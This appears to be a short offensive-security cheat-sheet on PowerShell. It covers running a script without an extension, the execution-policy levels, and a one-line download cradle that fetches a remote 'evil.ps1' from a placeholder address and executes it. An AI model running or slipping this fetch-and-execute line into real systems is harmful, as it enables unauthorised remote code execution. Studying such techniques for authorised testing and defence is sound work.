# Powershell

Powershell was Windows' answer to improving the scripting solution within Windows.  It's incredibly powerful for both Sysadmins as well as attackers.  Here I will include a number of snippets I've found useful for attacking devices with.

#### Executing a script without an extension

```text
powershell - < ps1file
```

#### Executing a script hosted on a web-server

```text
iex (new-object net.webclient).downloadstring('http://192.168.0.1/evil.ps1')
```

## Security Policy

So for security reasons the default policy for executing scripts is **Restricted**. Here are the different script-policies.

**Restricted**: PowerShell won't run any scripts. This is PowerShell's default execution policy.

**AllSigned**: PowerShell will only run scripts that are signed with a digital signature. If you run a script signed by a publisher PowerShell hasn't seen before, PowerShell will ask whether you trust the script's publisher.

**RemoteSigned**: PowerShell won't run scripts downloaded from the Internet unless they have a digital signature, but scripts not downloaded from the Internet will run without prompting. If a script has a digital signature, PowerShell will prompt you before it runs a script from a publisher it hasn't seen before.

**Unrestricted**: PowerShell ignores digital signatures but will still prompt you before running a script downloaded from the Internet.

